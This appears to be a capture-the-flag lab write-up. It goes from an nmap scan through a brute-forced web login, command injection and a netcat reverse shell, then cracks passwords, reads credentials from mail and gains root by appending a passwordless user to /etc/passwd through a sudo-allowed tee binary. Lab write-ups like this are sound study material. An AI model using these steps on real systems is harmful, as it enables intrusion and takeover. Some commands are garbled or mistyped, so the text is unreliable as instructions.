Started with a nmap scan
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCp6/VowbK8MWfMDQsxHRV2yvL8ZO+FEkyIBPnDwTVKkJiVKaJMZ5ztAwTnkc30c3tvC/yCqDAJ5IbHzgvR3kHKS37d17K+/OLxalDutFjrWjG7mBxhMW/0gnrCqJokZBDXDuvHQonajsfSN6FmWoP0PDsfL8NQXwWIoMvTRYHtiEQqczV5CYZZtMKuOyiLCiWINUqKMwY+PTb0M9RzSGYSJvN8sZZnvIw/xU7xBCmaWuq8h2dIfsxy+FhrwZMhvhJOpBYtwZB+hos3bbV5FKHhVztxEo+Y2vyKTl6MXJ4qwCChJdaBAip/aUt1zDoF3cIb+yebteyDk8KIqmp5Ju4r
|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIbZ4PXPXShXCcbe25IY3SYbzB4hxP4K2BliUGtuYSABZosGlLlL1Pi214yCLs3ORpGxsRIHv8R0KFQX+5SNSog=
|   256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDcvQZ2DbLqSSOzIbIXhyrDJ15duVKd9TEtxfX35ubsM
80/tcp open  http    syn-ack ttl 61 nginx 1.15.10
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.15.10
|_http-title: System Tools
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Going to the website all we have is a login forum and its running php did not find much with a gobuster scan but a `/command.php` that we could not get to we need to login taking a guess the username is `admin` so we tried to bruteforce a password and we got it `admin:happy` and we can use this webpage to do command injection if we send the request to burp we can modify it and change the `run` pram to `whoami` and we get `www-data` so we also now have command injection now we need to get reverse shell if we use the `nc mifko` and url encode it we now get a call back as `www-data` we can now read the flag if we go to the home folder of `jim` and there is also a backup folder with a list of old passwords we can try and crack one of these users and it cracked `jim:jibril04` now we can SSH into the machine and we gonna run linpeas now reading the `/var/mail` since jim has mail and there is `charles` password in the mail `charles:^xHhA&hvim0y` and if we run `sudo -l` we can run a binary called `teehee` with sudo permissions this binary is actually `tee` so we can add info to root files `sudo /usr/bin/teehee -a /etc/passwd` and then run `bowser::0:0:root:/root:/bin/bash` and then `control -c` and then we can so `su boswer` and now we are root